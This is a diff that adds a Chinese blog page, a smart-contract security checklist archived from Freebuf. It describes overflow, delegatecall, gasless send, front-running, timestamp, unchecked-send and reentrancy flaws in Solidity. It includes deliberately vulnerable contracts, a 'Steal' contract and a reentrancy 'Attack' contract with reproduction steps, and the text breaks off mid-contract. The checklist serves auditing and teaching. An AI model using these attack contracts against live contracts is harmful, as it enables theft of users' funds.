@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/avatar.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="Anemone's Blog" type="application/atom+xml">
+  <meta name="google-site-verification" content="Re5JdegRYzNFco-rC9lYIsvSWIgh5JvyfhuEaZCeFCk">
+  <meta name="baidu-site-verification" content="opTC8YN3Pn">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: 'GB90MXPJ1C',
+      apiKey: '05d808da3baf50ac2f2fad2dc3a3cd8f',
+      indexName: 'dev_blog',
+      hits: {"per_page":20},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文首次发表在Freebuf上，本文只做归档用。整形溢出(Arithmetic Issues)如下代码，如果没有assert判断，那么sellerBalance+value可能会超出uint上限制导致溢出。1234567891011pragma solidity ^0.4.15;contract Overflow &amp;#123;    uint private sellerBalance=0;">
+<meta name="keywords" content="源码安全,区块链,智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="智能合约Checklist">
+<meta property="og:url" content="http://anemone.top/blockchain-智能合约checklist/index.html">
+<meta property="og:site_name" content="Anemone&#39;s Blog">
+<meta property="og:description" content="本文首次发表在Freebuf上，本文只做归档用。整形溢出(Arithmetic Issues)如下代码，如果没有assert判断，那么sellerBalance+value可能会超出uint上限制导致溢出。1234567891011pragma solidity ^0.4.15;contract Overflow &amp;#123;    uint private sellerBalance=0;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://anemone.top/blockchain-智能合约checklist/1534317198703.png">
+<meta property="og:image" content="http://anemone.top/blockchain-智能合约checklist/1534316701411.png">
+<meta property="og:image" content="http://anemone.top/blockchain-智能合约checklist/1535892194599.png">
+<meta property="og:image" content="http://anemone.top/blockchain-智能合约checklist/1535891836531.png">
+<meta property="og:updated_time" content="2021-04-26T13:55:26.762Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="智能合约Checklist">
+<meta name="twitter:description" content="本文首次发表在Freebuf上，本文只做归档用。整形溢出(Arithmetic Issues)如下代码，如果没有assert判断，那么sellerBalance+value可能会超出uint上限制导致溢出。1234567891011pragma solidity ^0.4.15;contract Overflow &amp;#123;    uint private sellerBalance=0;">
+<meta name="twitter:image" content="http://anemone.top/blockchain-智能合约checklist/1534317198703.png">
+  <link rel="canonical" href="http://anemone.top/blockchain-智能合约checklist/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>智能合约Checklist | Anemone's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Anemone's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input" id="search-input"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+  
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://anemone.top/blockchain-智能合约checklist/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Anemone">
+      <meta itemprop="description" content="关注Web安全、移动安全、Fuzz测试和机器学习">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anemone's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">智能合约Checklist
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2018-09-14 09:27:49" itemprop="dateCreated datePublished" datetime="2018-09-14T09:27:49+08:00">2018-09-14</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-04-26 21:55:26" itemprop="dateModified" datetime="2021-04-26T21:55:26+08:00">2021-04-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/区块链/" itemprop="url" rel="index"><span itemprop="name">区块链</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span id="/blockchain-智能合约checklist/" class="post-meta-item leancloud_visitors" data-flag-title="智能合约Checklist" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>本文首次发表在<a href="https://www.freebuf.com/vuls/183357.html" target="_blank" rel="noopener">Freebuf</a>上，本文只做归档用。</strong></p><h1 id="整形溢出-Arithmetic-Issues"><a href="#整形溢出-Arithmetic-Issues" class="headerlink" title="整形溢出(Arithmetic Issues)"></a>整形溢出(Arithmetic Issues)</h1><p>如下代码，如果没有assert判断，那么sellerBalance+value可能会超出uint上限制导致溢出。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.15</span>;</span><br><span class="line">contract Overflow &#123;</span><br><span class="line">    uint private sellerBalance=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">uint value</span>) <span class="title">returns</span> (<span class="params">bool, uint</span>)</span>&#123;</span><br><span class="line">        sellerBalance += value; <span class="comment">// complicated math with possible overflow</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// possible auditor assert</span></span><br><span class="line">        assert(sellerBalance &gt;= value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+<h1 id="危险的delegatecall-dangerous-delegatecall-contractfuzzer"><a href="#危险的delegatecall-dangerous-delegatecall-contractfuzzer" class="headerlink" title="危险的delegatecall(dangerous delegatecall)contractfuzzer"></a>危险的delegatecall(dangerous delegatecall)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>首先需要了解call和delegatecall的区别：call和delegatecall都为合约相互调用时的函数，假设A调用B函数，call方法结果展示到B中，delegatecall方法结果展示到A中。</p>
+<p>在如下示例中，Mark如果用delegatecall调用了恶意合约Steal，那么Mark合约会被删除。</p>
+<p>复现：</p>
+<ol>
+<li>用A账户部署Steal，用B账户部署Mark合约，并在部署时为合约附加10个ether。</li>
+<li>账户B调用Mark.call(address(Steal))，即用B调用Steal的Innocence方法，实际上innocence会在Mark的上下文环境运行，发现账户B收到合约的10 ether（<strong>注意不是A账户</strong>)</li>
+<li>用C账户执行Mark.deposit()方法，并附加10ether，再调用destruct方法，发现B无法收到10ether，说明合约确实已经在第二步被销毁。</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.2</span>;</span><br><span class="line">contract Steal&#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">innocence</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        log0(<span class="string">"123"</span>);</span><br><span class="line">        selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Mark &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params">address a</span>) </span>&#123;</span><br><span class="line">        a.delegatecall(bytes4(keccak256(<span class="string">"innocence()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="无Gas发送-Gasless-Send-contractfuzzer"><a href="#无Gas发送-Gasless-Send-contractfuzzer" class="headerlink" title="无Gas发送(Gasless Send)contractfuzzer"></a>无Gas发送(Gasless Send)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>合约C调用合约D1时，由于fallback函数修改了storage变量——这是一个消耗大量gas的操作——导致了超过fallback的gas上限(2300gas)导致fallback失败，调用D2时，由于没有超过上限，调用成功。</p>
+<p>复现：</p>
+<ol>
+<li>用10ether部署C合约，0ether部署D1合约，0ether部署D2合约</li>
+<li>调用C.pay(1000000000000000000, address(D1))，D1的count值仍为0。</li>
+<li>调用D1.kill()，以太币不增加。2,3两步说明了D1的fallback调用失败</li>
+<li>调用C.pay(1000000000000000000,address(D2))</li>
+<li>调用D2.kill()，发现账户增加1ether，说明D2的fallback调用成功</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.2</span>;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pay</span>(<span class="params">uint n, address d</span>)</span>&#123;</span><br><span class="line">        d.send(n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D1 &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    uint public count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">        count = count+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D2  &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span> () payable&#123;</span><br><span class="line">        owner=msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">kill</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (owner == msg.sender) &#123;</span><br><span class="line">          selfdestruct(owner);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="依赖于交易顺序-条件竞争-TOD-Front-Running-smarter"><a href="#依赖于交易顺序-条件竞争-TOD-Front-Running-smarter" class="headerlink" title="依赖于交易顺序/条件竞争(TOD/Front Running)smarter"></a>依赖于交易顺序/条件竞争(TOD/Front Running)<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup></h1><p>由于：</p>
+<ol>
+<li>只有当交易被打包进区块时，他才是不可更改的</li>
+<li>区块会优先打包gasprice更高的交易</li>
+</ol>
+<p>所以攻击者可以恶意操控交易顺序从而使合约对自己有利。如图，出题人和做题人同时发起合约，那么做题人得到的奖励因合约执行顺序不同而不同。</p>
+<p><img src="/blockchain-智能合约checklist/1534317198703.png" alt="1534317198703"></p>
+<p>再例如ERC20标准中的approve，整个流程是这样的：</p>
+<ol>
+<li>用户A授权用户B 100代币的额度</li>
+<li>用户A觉得100代币的额度太高了，再次调用approve试图把额度改为50</li>
+<li>用户B在待交易处（打包前）看到了这笔交易</li>
+<li>用户B构造一笔提取100代币的交易，通过条件竞争将这笔交易打包到了修改额度之前，成功提取了100代币</li>
+<li>用户B发起了第二次交易，提取50代币，用户B成功拥有了150代币</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)&#123;</span><br><span class="line">    allowance[msg.sender][_spender] = _value;</span><br><span class="line">    return true</span><br></pre></td></tr></table></figure>
+<h1 id="依赖于时间戳-Timestamp-Dependence-Time-manipulation-contractfuzzer"><a href="#依赖于时间戳-Timestamp-Dependence-Time-manipulation-contractfuzzer" class="headerlink" title="依赖于时间戳(Timestamp Dependence/Time manipulation)contractfuzzer"></a>依赖于时间戳(Timestamp Dependence/Time manipulation)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p><img src="/blockchain-智能合约checklist/1534316701411.png" alt="1534316701411"></p>
+<p>攻击者可以修改区块的时间戳±900s以此获益。</p>
+<h1 id="依赖于区块号-BlockNumber-Dependency-contractfuzzer"><a href="#依赖于区块号-BlockNumber-Dependency-contractfuzzer" class="headerlink" title="依赖于区块号(BlockNumber Dependency)contractfuzzer"></a>依赖于区块号(BlockNumber Dependency)<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><p>和上面依赖时间戳类似</p>
+<h1 id="ExceptionDisordercontractfuzzer"><a href="#ExceptionDisordercontractfuzzer" class="headerlink" title="ExceptionDisordercontractfuzzer"></a>ExceptionDisorder<sup><a href="#fn_contractfuzzer" id="reffn_contractfuzzer">contractfuzzer</a></sup></h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint256 _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    etherLeft -= _amount;</span><br><span class="line">    msg.sender.send(_amount);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面给出的代码中使用 send() 函数进行转账，因为这里没有验证 send() 返回值，如果msg.sender 为合约账户 fallback() 调用失败，则 send() 返回false，最终导致账户余额减少了，钱却没有拿到。</p>
+<h1 id="未处理的异常-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter"><a href="#未处理的异常-Mishandled-Exceptions-Unchecked-Return-Values-For-Low-Level-Calls-smarter" class="headerlink" title="未处理的异常(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)smarter"></a>未处理的异常(Mishandled Exceptions/Unchecked Return Values For Low Level Calls)<sup><a href="#fn_smarter" id="reffn_smarter">smarter</a></sup></h1><p>例如合约KoET，攻击者可以控制函数调用次数（EVM限制调用深度为1024），从而导致send函数调用失败，但是接下来的代码会继续执行，这样前一个国王就无法得到报酬(compensation)。<br><img src="/blockchain-智能合约checklist/1535892194599.png" alt="1535892194599"></p>
+<p>Attacker：</p>
+<p><img src="/blockchain-智能合约checklist/1535891836531.png" alt="1535891836531"></p>
+<p><strong>复现失败，在Remix中运行递归会崩溃，在实际运行中由于Gas较高，无法交易（预算手续费大于30ether）。</strong></p>
+<h1 id="重入漏洞-Reentrancy-DAO-seebug1"><a href="#重入漏洞-Reentrancy-DAO-seebug1" class="headerlink" title="重入漏洞(Reentrancy/DAO)seebug1"></a>重入漏洞(Reentrancy/DAO)<sup><a href="#fn_seebug1" id="reffn_seebug1">seebug1</a></sup></h1><p>Solidity 中 <code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code>和<code>&lt;address&gt;.gas().call.vale()()</code>都可以用于向某一地址发送 ether，他们的区别在于：</p>
+<ol>
+<li><code>&lt;address&gt;.transfer()</code><ul>
+<li>当发送失败时会 throw; 回滚状态</li>
+<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
+</ul>
+</li>
+<li><code>&lt;address&gt;.send()</code><ul>
+<li>当发送失败时会返回 false 布尔值</li>
+<li>只会传递 2300 Gas 供调用，防止重入（reentrancy）</li>
+</ul>
+</li>
+<li><code>&lt;address&gt;.gas().call.value()()</code><ul>
+<li>当发送失败时会返回 false 布尔值</li>
+<li>传递所有可用 Gas 进行调用（可通过 gas(gas_value) 进行限制），不能有效防止重入（reentrancy）</li>
+</ul>
+</li>
+</ol>
+<p>当外部账户或其他合约向一个合约地址发送ether时，会执行该合约的fallback函数（当调用合约时没有匹配到函数，也会调用没有名字的fallback函数——The DAO）。且call.value()会将所有可用Gas给予外部调用（fallback函数），若在fallback函数中再调用withdraw函数，则会导致递归问题。攻击者可以部署一个恶意递归的合约将公共钱包这个合约账户里的Ether全部提出来。</p>
+<p>复现：</p>
+<ol>
+<li>账户A部署IDMoney合约，账户B部署Attack合约</li>
+<li>账户A调用IDMoney()方法，并附加10ether</li>
+<li>账户B部署Attack合约，附加2ether</li>
+<li>账户B调用Attack.setVictim()方法，设置victim变量为IDMoney合约地址</li>
+<li>账户B调用Attack.step1()方法，设置amount=1000000000000000000，即合约Attack调用合约IDMoney.deposit()方法</li>
+<li>账户B调用Attack.step2()方法，设置amount=500000000000000000</li>
+<li>账户B调用Attack.stopAttack()方法，获得IDMoney的所有余额（包括A的存款，严格说是合约中除了500000000000000000wei的余额）</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract IDMoney&#123;</span><br><span class="line">    address _owner;</span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) balances;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">IDMoney</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        _owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">address to, uint256 amount</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.sender] &gt;= amount);</span><br><span class="line">        <span class="built_in">require</span>(<span class="keyword">this</span>.balance &gt;= amount);</span><br><span class="line">        log0(bytes32(address(<span class="keyword">this</span>).balance/<span class="number">1e15</span>));</span><br><span class="line">        to.call.value(amount)();</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">balanceof</span>(<span class="params">address to</span>) <span class="title">constant</span> <span class="title">returns</span>(<span class="params">uint256</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> balances[to];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    address victim;</span><br><span class="line"></span><br><span class="line">    modifier ownerOnly &#123; <span class="built_in">require</span>(owner == msg.sender); _; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attack</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123; owner = msg.sender; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置已部署的 IDMoney 合约实例地址</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setVictim</span>(<span class="params">address target</span>) <span class="title">ownerOnly</span> </span>&#123; victim = target; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deposit Ether to IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step1</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.balance &gt; amount) &#123;</span><br><span class="line">            victim.call.value(amount)(bytes4(keccak256(<span class="string">"deposit()"</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// withdraw Ether from IDMoney deployed</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">step2</span>(<span class="params">uint256 amount</span>) <span class="title">ownerOnly</span> </span>&#123;</span><br><span class="line">        victim.call(bytes4(keccak256(<span class="string">"withdraw(address,uint256)"</span>)), <span class="keyword">this</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// selfdestruct, send all balance to owner</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 